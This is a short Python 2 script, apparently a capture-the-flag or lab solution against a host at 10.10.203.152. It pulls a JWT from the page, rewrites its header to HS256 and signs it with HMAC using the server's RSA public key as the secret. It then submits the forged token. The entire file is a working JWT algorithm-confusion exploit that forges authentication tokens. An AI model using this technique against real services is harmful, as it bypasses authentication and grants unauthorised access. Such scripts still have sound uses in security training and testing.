import urllib2
from bs4 import BeautifulSoup
import subprocess
import requests

url = "http://10.10.203.152"

response = urllib2.urlopen(url)  #making connecting

soup = BeautifulSoup(response.read(), from_encoding=response.info().getparam('charset'),features="html.parser")
xmp = soup.find('xmp').text
jwt_token = xmp.split(':')[1].strip()

hs256_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."+jwt_token.split('.')[1]  #taking header and payload to generate signature
pk = subprocess.check_output('cat public.pem | xxd -p | tr -d "\\n"', shell=True)  #public key 

print('\n')

cmd = 'echo -n {0} | openssl dgst -sha256 -mac HMAC -macopt hexkey:{1}'.format(hs256_jwt,pk) #command to generate signature

hmac_signature = subprocess.check_output(cmd,shell=True)
signature_base64 = hmac_signature.split('=')[1].strip().decode("hex").encode("base64").replace('=','') #converting it to bas64


new_jwt = hs256_jwt+'.'+signature_base64   #NEW TOKEN

x = requests.post(url, data = {'jwt':new_jwt})
print(x.text)



